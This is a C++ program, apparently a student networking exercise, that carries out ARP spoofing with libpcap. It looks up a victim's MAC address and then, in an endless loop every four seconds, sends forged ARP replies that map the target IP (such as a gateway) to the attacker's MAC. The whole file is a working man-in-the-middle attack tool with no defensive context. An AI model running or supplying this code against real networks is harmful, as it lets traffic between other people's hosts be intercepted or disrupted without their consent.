#include "ethhdr.h"
#include "arphdr.h"
#include "mac.h"

#include <cstdio>
#include <pcap.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include <iostream>
#include <chrono>
#include <thread>

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]");
    printf("sample: send-arp-test wlan0\n");
}
bool get_my_mac(char *macaddr,const char *if_name) {
    struct ifreq ifr;
    unsigned char* mac = NULL;
    int socketd = socket(AF_INET, SOCK_STREAM, 0);
    if(socketd < 0)
    {
        perror("socket");
        return false;
    }
    strcpy(ifr.ifr_name, if_name);
    if(ioctl(socketd, SIOCGIFHWADDR, &ifr) < 0)
    {
        perror("ioctl");
        return false;
    }
    mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    sprintf(macaddr,"%02x:%02x:%02x:%02x:%02x:%02x",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return true;
}
bool get_my_ip(char *ip, const char *if_name) {
    struct ifreq ifr;
    int socketd = socket(AF_INET, SOCK_DGRAM, 0);
    if(socketd < 0)
    {
        perror("socket");
        return false;
    }

    strcpy(ifr.ifr_name, if_name);

    if (ioctl(socketd, SIOCGIFADDR, &ifr) < 0)
    {
        perror("ioctl");
        return false;
    }
    sprintf(ip,"%s",inet_ntop(AF_INET,
                                ifr.ifr_addr.sa_data+2, ip, sizeof(struct sockaddr)));
    return true;
}
EthArpPacket packet_setting(
    const char* eth_dmac,
    const char* eth_smac,
    uint16_t eth_type,

    uint16_t arp_hrd,
    uint16_t eth_pro,
    uint16_t arp_op,
    const char* arp_smac,
    const char* arp_sip,
    const char* arp_tmac,
    const char* arp_tip) {

    EthArpPacket packet;
    packet.eth_.dmac_ = Mac(eth_dmac);
    packet.eth_.smac_ = Mac(eth_smac);
    packet.eth_.type_ = htons(eth_type);

    packet.arp_.hrd_ = htons(arp_hrd);
    packet.arp_.pro_ = htons(eth_pro);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(arp_op);
    packet.arp_.smac_ = Mac(arp_smac);
    packet.arp_.sip_ = htonl(Ip(arp_sip));
    packet.arp_.tmac_ = Mac(arp_tmac);
    packet.arp_.tip_ = htonl(Ip(arp_tip));

    return packet;
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    int count = (argc - 2)/2;

    while(true){
        for (int i = 0; i < count; i++)
        {
            char my_mac[18];
            char target_mac[18];
            char sender_mac[18];

            char my_ip[16];
            char* sender_ip = argv[2+(2*i)];
            char* target_ip = argv[3+(2*i)];

            if(!get_my_mac(my_mac, dev))
                return -1;
            if(!get_my_ip(my_ip, dev))
                return -1;

            // set default mac
            sprintf(target_mac,"%02x:%02x:%02x:%02x:%02x:%02x", 255, 255, 255, 255, 255, 255);
            sprintf(sender_mac,"%02x:%02x:%02x:%02x:%02x:%02x", 0, 0, 0, 0, 0, 0);

            EthArpPacket ask_Packet;
            ask_Packet = packet_setting(
                target_mac,
                my_mac,
                EthHdr::Arp,
                ArpHdr::ETHER,
                EthHdr::Ip4,
                ArpHdr::Request,
                my_mac,
                my_ip,
                sender_mac,
                sender_ip);

            printf("eth dmac: %s\n", ((std::string)ask_Packet.eth_.dmac()).c_str());
            printf("eth smac(my_mac):%s\n", ((std::string)ask_Packet.eth_.smac()).c_str());
            printf("arp tip(sender_ip): %s\n", ((std::string)ask_Packet.arp_.tip()).c_str());
            printf("arp tmac: %s\n", ((std::string)ask_Packet.arp_.tmac()).c_str());
            printf("arp sip(my_ip): %s\n", ((std::string)ask_Packet.arp_.sip()).c_str());
            printf("arp smac(my_mac): %s\n", ((std::string)ask_Packet.arp_.smac()).c_str());

            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&ask_Packet), sizeof(EthArpPacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }


            while(true)
            {
                const u_char* packet;
                struct pcap_pkthdr* header;
                int res = pcap_next_ex(handle, &header, &packet);

                if (res == 0) continue;
                if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                    printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                    break;
                }

                u_char* p = (u_char*)packet;
                EthHdr re_Ether;
                if(memcpy(&re_Ether, p, sizeof(EthHdr)) == NULL)
                {
                    printf("Can't Ether Header Packet Data copy");
                    return -1;
                }

                // 패킷이 ARP가 아니거나 목적지가 내가 아니라면 다시 잡는다.
                if(re_Ether.type() != EthHdr::Arp)
                    continue;
                if(re_Ether.dmac().operator!=(Mac(my_mac)))
                    continue;

                p += sizeof(EthHdr);

                ArpHdr re_Arp;
                if(memcpy(&re_Arp, p, sizeof(ArpHdr)) == NULL)
                {
                    printf("Can't Ether Header Packet Data copy");
                    return -1;
                }

                // Arp의 목적지가 내가 아니라면 다시 잡는다.
                if(re_Arp.op() != ArpHdr::Reply)
                    continue;

                if(re_Arp.tmac_.operator!=(Mac(my_mac)))
                    continue;

                if(!re_Arp.tip().operator==(Ip(my_ip)))
                    continue;

                sprintf(sender_mac,"%s",((std::string)re_Ether.smac()).c_str());
                printf("sender_mac: %s\n\n",((std::string)re_Ether.smac()).c_str());
                /*
                    현재 아는 사실 My Ip. My Mac, Target Ip, Sender Ip, Sender Mac
                */
                break;
            }


            EthArpPacket spoof_Packet;

            spoof_Packet = packet_setting(
                sender_mac,
                my_mac,
                EthHdr::Arp,
                ArpHdr::ETHER,
                EthHdr::Ip4,
                ArpHdr::Reply,
                my_mac,
                target_ip,
                sender_mac,
                sender_ip);
            printf("eth dmac(sender_mac): %s\n", ((std::string)spoof_Packet.eth_.dmac()).c_str());
            printf("eth smac(my_mac):%s\n", ((std::string)spoof_Packet.eth_.smac()).c_str());
            printf("arp tip(sender_ip): %s\n", ((std::string)spoof_Packet.arp_.tip()).c_str());
            printf("arp tmac(sender_mac): %s\n", ((std::string)spoof_Packet.arp_.tmac()).c_str());
            printf("arp sip(target_ip): %s\n", ((std::string)spoof_Packet.arp_.sip()).c_str());
            printf("arp smac(my_mac): %s\n", ((std::string)spoof_Packet.arp_.smac()).c_str());

            res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spoof_Packet), sizeof(EthArpPacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
        }
        printf("*****************************************************************\n");
        std::this_thread::sleep_for(std::chrono::seconds(4));
    }

    pcap_close(handle);
    return 0;
}
